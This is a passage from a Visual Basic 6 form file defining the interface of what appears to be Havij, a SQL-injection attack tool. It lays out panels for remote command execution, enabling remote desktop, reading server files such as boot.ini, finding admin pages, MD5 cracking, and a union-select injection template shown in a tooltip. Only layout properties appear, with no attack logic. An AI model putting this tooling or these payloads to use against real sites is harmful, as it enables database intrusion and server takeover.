         List            =   "FORM01.FRX":C2FD
         TabIndex        =   24
         Text            =   "dir C:\"
         Top             =   360
         Width           =   4215
      End
      Begin RichTextLib.RichTextBox cmdRes
         Height          =   3495
         Left            =   360
         TabIndex        =   25
         Top             =   840
         Width           =   8535
         _ExtentX        =   15055
         _ExtentY        =   6165
         _Version        =   393217
         DisableNoScroll =   -1
         ReadOnly        =   -1
         Enabled         =   -1
         BackColor       =  -2147483643
         ScrollBars      =   3
         Appearance      =   0
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851}
            Name            =   "Lucida Console"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0
            Italic          =   0
            Strikethrough   =   0
         EndProperty
      End
      Begin MSComctlLib.Toolbar Toolbar2
         Height          =   540
         Left            =   5760
         TabIndex        =   26
         Top             =   240
         Width           =   3135
         _ExtentX        =   5530
         _ExtentY        =   953
         _Version        =   393216
         AllowCustomize  =   0
         Wrappable       =   0
         ButtonWidth     =   1270
         ButtonHeight    =   953
         Style           =   1
         ImageList       =   "imlToolBar"
         DisabledImageList =   "imlToolBarDisabled"
         BeginProperty Buttons {66833FE8-8583-11D1-B16A-00C0F0283628}
            NumButtons      =   5
            BeginProperty Button1 {66833FEA-8583-11D1-B16A-00C0F0283628}
               Caption         =   "Execute"
               ImageKey        =   "go"
            EndProperty
            BeginProperty Button2 {66833FEA-8583-11D1-B16A-00C0F0283628}
               Style           =   3
            EndProperty
            BeginProperty Button3 {66833FEA-8583-11D1-B16A-00C0F0283628}
               Caption         =   "xp_exec"
               Object.ToolTipText =   "Enable XP_Exec"
               ImageKey        =   "cmd"
            EndProperty
            BeginProperty Button4 {66833FEA-8583-11D1-B16A-00C0F0283628}
               Caption         =   "os_ex"
               Object.ToolTipText =   "Enable OS_Ex"
               ImageKey        =   "cmd"
            EndProperty
            BeginProperty Button5 {66833FEA-8583-11D1-B16A-00C0F0283628}
               Caption         =   "RD"
               Object.ToolTipText =   "Enable remote desktop"
               ImageKey        =   "rdp"
            EndProperty
         EndProperty
      End
      Begin VB.Label Label14
         AutoSize        =  -1
         BackStyle       =   0
         Caption         =   "Command:"
         Height          =   195
         Left            =   360
         TabIndex        =   27
         Top             =   360
         Width           =   750
      End
   End
   Begin InetCtlsObjects.Inet Inet
      Left            =   7440
      Top             =   8040
      _ExtentX        =   1005
      _ExtentY        =   1005
      _Version        =   393216
      AccessType      =   1
   End
   Begin VB.Frame frmMain
      Height          =   4695
      Index           =   6
      Left            =   360
      TabIndex        =   32
      Top             =   3120
      Width           =   9255
      Begin VB.PictureBox picBack
         BorderStyle     =   0
         Height          =   3015
         Index           =   0
         Left            =   1080
         ScaleHeight     =   3015
         ScaleWidth      =   6855
         TabIndex        =   63
         Top             =   840
         Width           =   6855
         Begin VB.CheckBox chkEncodeStrings
            BeginProperty Font
               Name            =   "Verdana"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0
               Italic          =   0
               Strikethrough   =   0
            EndProperty
            Caption         =   "Automatically convert strings."
            Height          =   255
            Left            =   120
            TabIndex        =   90
            Top             =   2760
            Value           =   1
            Width           =   2895
         End
         Begin VB.TextBox txtQueryResult
            BeginProperty Font
               Name            =   "Verdana"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0
               Italic          =   0
               Strikethrough   =   0
            EndProperty
            Height          =   2055
            Left            =   120
            Locked          =  -1
            MultiLine       =  -1
            TabIndex        =   89
            Top             =   600
            Width           =   6495
         End
         Begin VB.ComboBox Combo1
            Height          =   315
            ItemData        =   "FORM01.FRX":C4C8
            Left            =   600
            List            =   "FORM01.FRX":C393
            TabIndex        =   64
            Top             =   120
            Width           =   5175
         End
         Begin MSComctlLib.Toolbar Toolbar3
            Height          =   540
            Left            =   6000
            TabIndex        =   65
            Top             =   0
            Width           =   765
            _ExtentX        =   1349
            _ExtentY        =   953
            _Version        =   393216
            AllowCustomize  =   0
            ButtonWidth     =   1217
            ButtonHeight    =   953
            Style           =   1
            ImageList       =   "imlToolBar"
            DisabledImageList =   "imlToolBarDisabled"
            BeginProperty Buttons {66833FE8-8583-11D1-B16A-00C0F0283628}
               NumButtons      =   1
               BeginProperty Button1 {66833FEA-8583-11D1-B16A-00C0F0283628}
                  Caption         =   "Execute"
                  ImageKey        =   "go"
               EndProperty
            EndProperty
         End
         Begin VB.Label Label16
            AutoSize        =  -1
            BackStyle       =   0
            Caption         =   "Query:"
            Height          =   195
            Left            =   0
            TabIndex        =   66
            Top             =   120
            Width           =   465
         End
      End
   End
   Begin VB.Frame frmMain
      Height          =   4695
      Index           =   1
      Left            =   360
      TabIndex        =   11
      Top             =   3120
      Width           =   9255
      Begin VB.TextBox txtInfo
         BeginProperty Font
            Name            =   "Verdana"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0
            Italic          =   0
            Strikethrough   =   0
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   3495
         Left            =   360
         Locked          =  -1
         MultiLine       =  -1
         ScrollBars      =   3
         TabIndex        =   13
         Top             =   840
         Width           =   8535
      End
      Begin MSComctlLib.Toolbar tlbInfo
         Height          =   540
         Left            =   360
         TabIndex        =   12
         Top             =   240
         Width           =   7455
         _ExtentX        =   13150
         _ExtentY        =   953
         _Version        =   393216
         AllowCustomize  =   0
         ButtonWidth     =   820
         ButtonHeight    =   953
         Style           =   1
         ImageList       =   "imlToolBar"
         DisabledImageList =   "imlToolBarDisabled"
         BeginProperty Buttons {66833FE8-8583-11D1-B16A-00C0F0283628}
            NumButtons      =   4
            BeginProperty Button1 {66833FEA-8583-11D1-B16A-00C0F0283628}
               Caption         =   "Get"
               Object.ToolTipText =   "Get Information"
               ImageKey        =   "go"
            EndProperty
            BeginProperty Button2 {66833FEA-8583-11D1-B16A-00C0F0283628}
               Enabled         =   0
               Caption         =   "Stop"
               ImageKey        =   "stop"
            EndProperty
            BeginProperty Button3 {66833FEA-8583-11D1-B16A-00C0F0283628}
               Style           =   3
            EndProperty
            BeginProperty Button4 {66833FEA-8583-11D1-B16A-00C0F0283628}
               Caption         =   "Save"
               ImageKey        =   "save"
            EndProperty
         EndProperty
      End
   End
   Begin VB.Frame frmMain
      Height          =   4695
      Index           =   7
      Left            =   360
      TabIndex        =   34
      Top             =   3120
      Width           =   9255
      Begin VB.TextBox txtRetry
         BeginProperty Font
            Name            =   "Verdana"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0
            Italic          =   0
            Strikethrough   =   0
         EndProperty
         Height          =   285
         Left            =   7080
         TabIndex        =   45
         Text            =   "1"
         Top             =   1320
         Width           =   615
      End
      Begin VB.TextBox txtTimeOut
         BeginProperty Font
            Name            =   "Verdana"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0
            Italic          =   0
            Strikethrough   =   0
         EndProperty
         Height          =   285
         Left            =   4800
         TabIndex        =   43
         Text            =   "10"
         Top             =   1320
         Width           =   975
      End
      Begin VB.TextBox txtThreads
         BeginProperty Font
            Name            =   "Verdana"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0
            Italic          =   0
            Strikethrough   =   0
         EndProperty
         Height          =   285
         Left            =   7080
         TabIndex        =   41
         Text            =   "5"
         Top             =   900
         Width           =   615
      End
      Begin VB.TextBox txtApps
         BeginProperty Font
            Name            =   "Verdana"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0
            Italic          =   0
            Strikethrough   =   0
         EndProperty
         Height          =   285
         Left            =   4800
         TabIndex        =   39
         Text            =   "php,asp"
         Top             =   900
         Width           =   975
      End
      Begin VB.TextBox txtAdminPath
         BeginProperty Font
            Name            =   "Verdana"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0
            Italic          =   0
            Strikethrough   =   0
         EndProperty
         Height          =   285
         Left            =   1920
         TabIndex        =   37
         Text            =   "http://target.com/"
         Top             =   480
         Width           =   5775
      End
      Begin MSComctlLib.Toolbar Toolbar4
         Height          =   540
         Left            =   8040
         TabIndex        =   35
         Top             =   720
         Width           =   735
         _ExtentX        =   1296
         _ExtentY        =   953
         _Version        =   393216
         AllowCustomize  =   0
         ButtonWidth     =   1138
         ButtonHeight    =   953
         Style           =   1
         ImageList       =   "imlToolBar"
         DisabledImageList =   "imlToolBarDisabled"
         BeginProperty Buttons {66833FE8-8583-11D1-B16A-00C0F0283628}
            NumButtons      =   1
            BeginProperty Button1 {66833FEA-8583-11D1-B16A-00C0F0283628}
               Caption         =   "  Start  "
               ImageKey        =   "go"
            EndProperty
         EndProperty
      End
      Begin Project1.LynxGrid lstFoundPages
         Height          =   2340
         Left            =   600
         TabIndex        =   60
         Top             =   1920
         Width           =   8040
         _extentx        =   14182
         _extenty        =   4128
         BeginProperty font {0BE35203-8F91-11CE-9DE3-00AA004BB851}
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0
            Italic          =   0
            Strikethrough   =   0
         EndProperty
         BeginProperty fontheader {0BE35203-8F91-11CE-9DE3-00AA004BB851}
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0
            Italic          =   0
            Strikethrough   =   0
         EndProperty
         backcolorbkg    =   16777215
         backcolorsel    =   65535
         forecolorsel    =   0
         customcolorfrom =   16572875
         customcolorto   =   14722429
         gridcolor       =   16367254
         focusrectmode   =   2
         focusrectcolor  =   128
         gridlines       =   3
         themecolor      =   5
         appearance      =   0
         showrownumbersvary =  -1
         allowcolumnresizing =  -1
         columndrag      =  -1
         columnsort      =  -1
         editable        =  -1
         allowdelete     =  -1
         allowinsert     =  -1
         focusrowhighlightstyle =   1
      End
      Begin VB.PictureBox Picture1
         Appearance      =   0
         BorderStyle     =   0
         ForeColor       =   &H80000008&
         Height          =   855
         Left            =   600
         ScaleHeight     =   855
         ScaleWidth      =   2775
         TabIndex        =   47
         Top             =   840
         Width           =   2775
         Begin VB.TextBox txtSuccess
            BeginProperty Font
               Name            =   "Verdana"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0
               Italic          =   0
               Strikethrough   =   0
            EndProperty
            Height          =   285
            Left            =   1320
            TabIndex        =   51
            Text            =   "200,500,301,302,403"
            Top             =   60
            Width           =   1335
         End
         Begin VB.TextBox txtFailure
            BeginProperty Font
               Name            =   "Verdana"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0
               Italic          =   0
               Strikethrough   =   0
            EndProperty
            Enabled         =   0
            Height          =   285
            Left            =   1320
            TabIndex        =   50
            Text            =   "400,401,404"
            Top             =   480
            Width           =   1335
         End
         Begin VB.OptionButton optSuccess
            Caption         =   "Success res:"
            Height          =   255
            Left            =   0
            TabIndex        =   49
            Top             =   60
            Value           =  -1
            Width           =   1335
         End
         Begin VB.OptionButton optFailure
            Caption         =   "Failture res:"
            Height          =   255
            Left            =   0
            TabIndex        =   48
            Top             =   480
            Width           =   1335
         End
      End
      Begin VB.Label Label26
         AutoSize        =  -1
         BackStyle       =   0
         Caption         =   "Time out:"
         Height          =   195
         Left            =   3840
         TabIndex        =   44
         Top             =   1335
         Width           =   660
      End
      Begin VB.Label Label23
         AutoSize        =  -1
         BackStyle       =   0
         Caption         =   "Web Apps:"
         Height          =   195
         Left            =   3840
         TabIndex        =   38
         Top             =   915
         Width           =   795
      End
      Begin VB.Label Label27
         AutoSize        =  -1
         BackStyle       =   0
         Caption         =   "Retries:"
         Height          =   195
         Left            =   6360
         TabIndex        =   46
         Top             =   1335
         Width           =   540
      End
      Begin VB.Label Label25
         AutoSize        =  -1
         BackStyle       =   0
         Caption         =   "Found Pages:"
         Height          =   195
         Left            =   600
         TabIndex        =   42
         Top             =   1680
         Width           =   990
      End
      Begin VB.Label Label24
         AutoSize        =  -1
         BackStyle       =   0
         Caption         =   "Threads:"
         Height          =   195
         Left            =   6360
         TabIndex        =   40
         Top             =   915
         Width           =   630
      End
      Begin VB.Label Label22
         AutoSize        =  -1
         BackStyle       =   0
         Caption         =   "Path to search:"
         Height          =   195
         Left            =   600
         TabIndex        =   36
         Top             =   480
         Width           =   1080
      End
   End
   Begin VB.Frame frmMain
      Height          =   4695
      Index           =   8
      Left            =   360
      TabIndex        =   52
      Top             =   3120
      Width           =   9255
      Begin VB.TextBox txtHash
         BeginProperty Font
            Name            =   "Verdana"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0
            Italic          =   0
            Strikethrough   =   0
         EndProperty
         Height          =   285
         Left            =   2280
         TabIndex        =   53
         Text            =   "e10adc3949ba59abbe56e057f20f883e"
         Top             =   480
         Width           =   5415
      End
      Begin MSComctlLib.Toolbar Toolbar5
         Height          =   540
         Left            =   7800
         TabIndex        =   54
         Top             =   480
         Width           =   735
         _ExtentX        =   1296
         _ExtentY        =   953
         _Version        =   393216
         AllowCustomize  =   0
         ButtonWidth     =   1138
         ButtonHeight    =   953
         Style           =   1
         ImageList       =   "imlToolBar"
         DisabledImageList =   "imlToolBarDisabled"
         BeginProperty Buttons {66833FE8-8583-11D1-B16A-00C0F0283628}
            NumButtons      =   1
            BeginProperty Button1 {66833FEA-8583-11D1-B16A-00C0F0283628}
               Caption         =   "  Start  "
               ImageKey        =   "go"
            EndProperty
         EndProperty
      End
      Begin Project1.LynxGrid md5List
         Height          =   2940
         Left            =   840
         TabIndex        =   55
         Top             =   1320
         Width           =   7560
         _extentx        =   13335
         _extenty        =   5186
         BeginProperty font {0BE35203-8F91-11CE-9DE3-00AA004BB851}
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0
            Italic          =   0
            Strikethrough   =   0
         EndProperty
         BeginProperty fontheader {0BE35203-8F91-11CE-9DE3-00AA004BB851}
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0
            Italic          =   0
            Strikethrough   =   0
         EndProperty
         backcolorbkg    =   16777215
         backcolorsel    =   65535
         forecolorsel    =   0
         customcolorfrom =   16572875
         customcolorto   =   14722429
         gridcolor       =   16367254
         focusrectmode   =   2
         focusrectcolor  =   128
         gridlines       =   3
         themecolor      =   5
         appearance      =   0
         showrownumbersvary =  -1
         allowcolumnresizing =  -1
         columndrag      =  -1
         columnsort      =  -1
         editable        =  -1
         allowdelete     =  -1
         allowinsert     =  -1
         focusrowhighlightstyle =   1
      End
      Begin VB.Label lblHash
         AutoSize        =  -1
         BackStyle       =   0
         Height          =   195
         Left            =   2280
         TabIndex        =   58
         Top             =   960
         Width           =   45
      End
      Begin VB.Label Label36
         AutoSize        =  -1
         BackStyle       =   0
         Caption         =   "MD5 hash:"
         Height          =   195
         Left            =   840
         TabIndex        =   57
         Top             =   480
         Width           =   780
      End
      Begin VB.Label Label33
         AutoSize        =  -1
         BackStyle       =   0
         Caption         =   "Result for hash:"
         Height          =   195
         Left            =   840
         TabIndex        =   56
         Top             =   960
         Width           =   1110
      End
   End
   Begin VB.Frame frmMain
      Height          =   4695
      Index           =   3
      Left            =   360
      TabIndex        =   17
      Top             =   3120
      Width           =   9255
      Begin VB.ComboBox cmbFiletoRead
         Height          =   315
         ItemData        =   "FORM01.FRX":C4FF
         Left            =   1440
         List            =   "FORM01.FRX":C4E1
         TabIndex        =   18
         Text            =   "C:\boot.ini"
         Top             =   360
         Width           =   6735
      End
      Begin RichTextLib.RichTextBox txtReadFile
         Height          =   3495
         Left            =   360
         TabIndex        =   19
         Top             =   840
         Width           =   8535
         _ExtentX        =   15055
         _ExtentY        =   6165
         _Version        =   393217
         DisableNoScroll =   -1
         ReadOnly        =   -1
         Enabled         =   -1
         BackColor       =  -2147483643
         ScrollBars      =   3
         Appearance      =   0
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851}
            Name            =   "Verdana"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0
            Italic          =   0
            Strikethrough   =   0
         EndProperty
      End
      Begin MSComctlLib.Toolbar tlbRead
         Height          =   540
         Left            =   8400
         TabIndex        =   20
         Top             =   240
         Width           =   615
         _ExtentX        =   1085
         _ExtentY        =   953
         _Version        =   393216
         AllowCustomize  =   0
         ButtonWidth     =   847
         ButtonHeight    =   953
         Style           =   1
         ImageList       =   "imlToolBar"
         DisabledImageList =   "imlToolBarDisabled"
         BeginProperty Buttons {66833FE8-8583-11D1-B16A-00C0F0283628}
            NumButtons      =   1
            BeginProperty Button1 {66833FEA-8583-11D1-B16A-00C0F0283628}
               Caption         =   "Read"
               ImageKey        =   "go"
            EndProperty
         EndProperty
      End
      Begin VB.Label Label8
         AutoSize        =  -1
         BackStyle       =   0
         Caption         =   "File Address:"
         Height          =   195
         Left            =   360
         TabIndex        =   21
         Top             =   360
         Width           =   900
      End
   End
   Begin VB.Timer tmrAfterEdit
      Enabled         =   0
      Interval        =   50
      Left            =   5400
      Top             =   8040
   End
   Begin MSComctlLib.ImageList imlToolBarDisabled
      Left            =   4680
      Top             =   0
      _ExtentX        =   1005
      _ExtentY        =   1005
      _Version        =   393216
      ImageWidth      =   16
      ImageHeight     =   16
      MaskColor       =   16777215
      BackColor       =  -2147483643
      BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628}
         NumListImages   =   20
         BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628}
            Picture         =   "FORM01.FRX":C509
            Key             =   "db"
         EndProperty
         BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628}
            Picture         =   "FORM01.FRX":C85B
            Key             =   "getcolumns"
         EndProperty
         BeginProperty ListImage3 {2C247F27-8591-11D1-B16A-00C0F0283628}
            Picture         =   "FORM01.FRX":CB4D
            Key             =   "getdata"
         EndProperty
         BeginProperty ListImage4 {2C247F27-8591-11D1-B16A-00C0F0283628}
            Picture         =   "FORM01.FRX":CE9F
            Key             =   "gettables"
         EndProperty
         BeginProperty ListImage5 {2C247F27-8591-11D1-B16A-00C0F0283628}
            Picture         =   "FORM01.FRX":D101
            Key             =   "go"
         EndProperty
         BeginProperty ListImage6 {2C247F27-8591-11D1-B16A-00C0F0283628}
            Picture         =   "FORM01.FRX":D453
            Key             =   "havij"
         EndProperty
         BeginProperty ListImage7 {2C247F27-8591-11D1-B16A-00C0F0283628}
            Picture         =   "FORM01.FRX":D7A5
            Key             =   "info"
         EndProperty
         BeginProperty ListImage8 {2C247F27-8591-11D1-B16A-00C0F0283628}
            Picture         =   "FORM01.FRX":DAF7
            Key             =   "readfiles"
         EndProperty
         BeginProperty ListImage9 {2C247F27-8591-11D1-B16A-00C0F0283628}
            Picture         =   "FORM01.FRX":DE49
            Key             =   "save"
         EndProperty
         BeginProperty ListImage10 {2C247F27-8591-11D1-B16A-00C0F0283628}
            Picture         =   "FORM01.FRX":E19B
            Key             =   "settings"
         EndProperty
         BeginProperty ListImage11 {2C247F27-8591-11D1-B16A-00C0F0283628}
            Picture         =   "FORM01.FRX":E4ED
            Key             =   "stop"
         EndProperty
         BeginProperty ListImage12 {2C247F27-8591-11D1-B16A-00C0F0283628}
            Picture         =   "FORM01.FRX":E83F
            Key             =   "tables"
         EndProperty
         BeginProperty ListImage13 {2C247F27-8591-11D1-B16A-00C0F0283628}
            Picture         =   "FORM01.FRX":EB91
         EndProperty
         BeginProperty ListImage14 {2C247F27-8591-11D1-B16A-00C0F0283628}
            Picture         =   "FORM01.FRX":EEE3
            Key             =   "query"
         EndProperty
         BeginProperty ListImage15 {2C247F27-8591-11D1-B16A-00C0F0283628}
            Picture         =   "FORM01.FRX":F235
            Key             =   "findadmin"
         EndProperty
         BeginProperty ListImage16 {2C247F27-8591-11D1-B16A-00C0F0283628}
            Picture         =   "FORM01.FRX":F587
            Key             =   "md5"
         EndProperty
         BeginProperty ListImage17 {2C247F27-8591-11D1-B16A-00C0F0283628}
            Picture         =   "FORM01.FRX":F8D9
            Key             =   "load"
         EndProperty
         BeginProperty ListImage18 {2C247F27-8591-11D1-B16A-00C0F0283628}
            Picture         =   "FORM01.FRX":FC2B
            Key             =   "ok"
         EndProperty
         BeginProperty ListImage19 {2C247F27-8591-11D1-B16A-00C0F0283628}
            Picture         =   "FORM01.FRX":FF7D
            Key             =   "pause"
         EndProperty
         BeginProperty ListImage20 {2C247F27-8591-11D1-B16A-00C0F0283628}
            Picture         =   "FORM01.FRX":102D1
            Key             =   "pause1"
         EndProperty
      EndProperty
   End
   Begin MSComctlLib.ImageList imlToolBar
      Left            =   3960
      Top             =   0
      _ExtentX        =   1005
      _ExtentY        =   1005
      _Version        =   393216
      ImageWidth      =   16
      ImageHeight     =   16
      MaskColor       =   16777215
      BackColor       =  -2147483643
      BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628}
         NumListImages   =   21
         BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628}
            Picture         =   "FORM01.FRX":10623
            Key             =   "db"
         EndProperty
         BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628}
            Picture         =   "FORM01.FRX":10975
            Key             =   "getcolumns"
         EndProperty
         BeginProperty ListImage3 {2C247F27-8591-11D1-B16A-00C0F0283628}
            Picture         =   "FORM01.FRX":10C67
            Key             =   "getdata"
         EndProperty
         BeginProperty ListImage4 {2C247F27-8591-11D1-B16A-00C0F0283628}
            Picture         =   "FORM01.FRX":10FB9
            Key             =   "gettables"
         EndProperty
         BeginProperty ListImage5 {2C247F27-8591-11D1-B16A-00C0F0283628}
            Picture         =   "FORM01.FRX":1121B
            Key             =   "go"
         EndProperty
         BeginProperty ListImage6 {2C247F27-8591-11D1-B16A-00C0F0283628}
            Picture         =   "FORM01.FRX":1156D
            Key             =   "havij"
         EndProperty
         BeginProperty ListImage7 {2C247F27-8591-11D1-B16A-00C0F0283628}
            Picture         =   "FORM01.FRX":118BF
            Key             =   "info"
         EndProperty
         BeginProperty ListImage8 {2C247F27-8591-11D1-B16A-00C0F0283628}
            Picture         =   "FORM01.FRX":11C11
            Key             =   "readfiles"
         EndProperty
         BeginProperty ListImage9 {2C247F27-8591-11D1-B16A-00C0F0283628}
            Picture         =   "FORM01.FRX":11F63
            Key             =   "save"
         EndProperty
         BeginProperty ListImage10 {2C247F27-8591-11D1-B16A-00C0F0283628}
            Picture         =   "FORM01.FRX":122B5
            Key             =   "settings"
         EndProperty
         BeginProperty ListImage11 {2C247F27-8591-11D1-B16A-00C0F0283628}
            Picture         =   "FORM01.FRX":12607
            Key             =   "stop"
         EndProperty
         BeginProperty ListImage12 {2C247F27-8591-11D1-B16A-00C0F0283628}
            Picture         =   "FORM01.FRX":12959
            Key             =   "tables"
         EndProperty
         BeginProperty ListImage13 {2C247F27-8591-11D1-B16A-00C0F0283628}
            Picture         =   "FORM01.FRX":12CAB
            Key             =   "cmd"
         EndProperty
         BeginProperty ListImage14 {2C247F27-8591-11D1-B16A-00C0F0283628}
            Picture         =   "FORM01.FRX":12FFD
            Key             =   "query"
         EndProperty
         BeginProperty ListImage15 {2C247F27-8591-11D1-B16A-00C0F0283628}
            Picture         =   "FORM01.FRX":1334F
            Key             =   "findadmin"
         EndProperty
         BeginProperty ListImage16 {2C247F27-8591-11D1-B16A-00C0F0283628}
            Picture         =   "FORM01.FRX":136A1
            Key             =   "md5"
         EndProperty
         BeginProperty ListImage17 {2C247F27-8591-11D1-B16A-00C0F0283628}
            Picture         =   "FORM01.FRX":139F3
            Key             =   "load"
         EndProperty
         BeginProperty ListImage18 {2C247F27-8591-11D1-B16A-00C0F0283628}
            Picture         =   "FORM01.FRX":13D45
            Key             =   "ok"
         EndProperty
         BeginProperty ListImage19 {2C247F27-8591-11D1-B16A-00C0F0283628}
            Picture         =   "FORM01.FRX":14097
            Key             =   "rdp"
         EndProperty
         BeginProperty ListImage20 {2C247F27-8591-11D1-B16A-00C0F0283628}
            Picture         =   "FORM01.FRX":143E9
            Key             =   "pause"
         EndProperty
         BeginProperty ListImage21 {2C247F27-8591-11D1-B16A-00C0F0283628}
            Picture         =   "FORM01.FRX":1473B
            Key             =   "pause1"
         EndProperty
      EndProperty
   End
   Begin VB.Timer tmrAnim
      Interval        =   50
      Left            =   6120
      Top             =   8040
   End
   Begin MSComDlg.CommonDialog Co
      Left            =   5640
      Top             =   0
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
      CancelError     =   -1
      Flags           =   4
      Filter          =   "HTML Files|*.html;*.htm"
   End
   Begin VB.Frame Frame3
      Height          =   2055
      Left            =   360
      TabIndex        =   2
      Top             =   240
      Width           =   9255
      Begin VB.TextBox txtPostData
         BeginProperty Font
            Name            =   "Verdana"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0
            Italic          =   0
            Strikethrough   =   0
         EndProperty
         Enabled         =   0
         Height          =   285
         Left            =   1440
         TabIndex        =   91
         Top             =   1560
         Width           =   6135
      End
      Begin VB.TextBox txtManSyntax
         BeginProperty Font
            Name            =   "Verdana"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0
            Italic          =   0
            Strikethrough   =   0
         EndProperty
         ForeColor       =   &H80000011&
         Height          =   285
         Left            =   4800
         Locked          =  -1
         TabIndex        =   33
         Text            =   "Auto Detect"
         ToolTipText     =   "Example: -1 union all select null,null,%String_Col%,null --"
         Top             =   765
         Width           =   2775
      End
      Begin VB.TextBox txtKeyword
         BeginProperty Font
            Name            =   "Verdana"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0
            Italic          =   0
            Strikethrough   =   0
         EndProperty
         ForeColor       =   &H80000011&
         Height          =   285
         Left            =   1440
         Locked          =  -1
         TabIndex        =   82
         Text            =   "Auto Detect"
         Top             =   765
         Width           =   2175
      End
      Begin VB.PictureBox Picture4
         Appearance      =   0
         BorderStyle     =   0
         ForeColor       =   &H80000008&
         Height          =   375
         Left            =   360
         ScaleHeight     =   375
         ScaleWidth      =   1000
         TabIndex        =   80
         Top             =   720
         Width           =   1000
         Begin VB.CheckBox chkKeyword
            Caption         =   "Keyword:"
            Height          =   255
            Left            =   0
            TabIndex        =   81
            Top             =   60
            Width           =   975
         End
      End
      Begin VB.PictureBox Picture2
         Appearance      =   0
         BorderStyle     =   0
         ForeColor       =   &H80000008&
         Height          =   375
         Left            =   3840
         ScaleHeight     =   375
         ScaleWidth      =   915
         TabIndex        =   61
         Top             =   720
         Width           =   915
         Begin VB.CheckBox chkManSyntax
            Caption         =   "Syntax:"
            Height          =   255
            Left            =   0
            TabIndex        =   62
            ToolTipText     =   "Enter injection. Specify string column with %String_Col% (mysql and mssql no error)"
            Top             =   60
            Width           =   855
         End
      End
      Begin VB.ComboBox cmbDataBase
         BeginProperty Font
            Name            =   "Verdana"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0
            Italic          =   0
            Strikethrough   =   0
         EndProperty
         Height          =   315
         ItemData        =   "FORM01.FRX":14B88
         Left            =   1440
         List            =   "FORM01.FRX":14A8D
         Style           =   2
         TabIndex        =   30
         Top             =   1155
         Width           =   2175
      End
      Begin VB.ComboBox cmbType
         BeginProperty Font
            Name            =   "Verdana"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0
            Italic          =   0
            Strikethrough   =   0
         EndProperty
         Height          =   315
         ItemData        =   "FORM01.FRX":14BDE
         Left            =   6240
         List            =   "FORM01.FRX":14BBC
         Style           =   2
         TabIndex        =   7
         Top             =   1155
         Width           =   1335
      End
      Begin VB.ComboBox cmbMethod
         BeginProperty Font
            Name            =   "Verdana"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0
            Italic          =   0
            Strikethrough   =   0
         EndProperty
         Height          =   315
         ItemData        =   "FORM01.FRX":14BFA
         Left            =   4800
         List            =   "FORM01.FRX":14BEB
         Style           =   2
         TabIndex        =   5
         Top             =   1155
         Width           =   855
      End
      Begin VB.TextBox txtTarget
         BeginProperty Font
            Name            =   "Verdana"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0
            Italic          =   0
            Strikethrough   =   0
         EndProperty
         Height          =   285
         Left            =   1440
         TabIndex        =   0
         Text            =   "http://www.target.com/index.asp?id=123"
         Top             =   360
         Width           =   6135
      End
      Begin MSComctlLib.Toolbar Toolbar6
         Height          =   540
         Left            =   7875
         TabIndex        =   79
         Top             =   1080
         Width           =   1095
         _ExtentX        =   1931
         _ExtentY        =   953
         _Version        =   393216
         AllowCustomize  =   0
         Wrappable       =   0
         ButtonWidth     =   820
         ButtonHeight    =   953
         Style           =   1
         ImageList       =   "imlToolBar"
         DisabledImageList =   "imlToolBarDisabled"
         BeginProperty Buttons {66833FE8-8583-11D1-B16A-00C0F0283628}
            NumButtons      =   2
            BeginProperty Button1 {66833FEA-8583-11D1-B16A-00C0F0283628}
               Caption         =   "Load"
               ImageKey        =   "load"
            EndProperty
            BeginProperty Button2 {66833FEA-8583-11D1-B16A-00C0F0283628}
               Caption         =   "Save"
               ImageKey        =   "save"
            EndProperty
         EndProperty
      End
      Begin MSComctlLib.Toolbar Toolbar1
         Height          =   540
         Left            =   7680
         TabIndex        =   8
         Top             =   360
         Width           =   1455
         _ExtentX        =   2566
         _ExtentY        =   953
         _Version        =   393216
         AllowCustomize  =   0
         Wrappable       =   0
         ButtonWidth     =   1191
         ButtonHeight    =   953
         Style           =   1
         ImageList       =   "imlToolBar"
         DisabledImageList =   "imlToolBarDisabled"
         BeginProperty Buttons {66833FE8-8583-11D1-B16A-00C0F0283628}
            NumButtons      =   2
            BeginProperty Button1 {66833FEA-8583-11D1-B16A-00C0F0283628}
               Caption         =   "Analyze"
               ImageKey        =   "go"
            EndProperty
            BeginProperty Button2 {66833FEA-8583-11D1-B16A-00C0F0283628}
               Enabled         =   0
               Caption         =   "Pause"
               Key             =   "Pause"
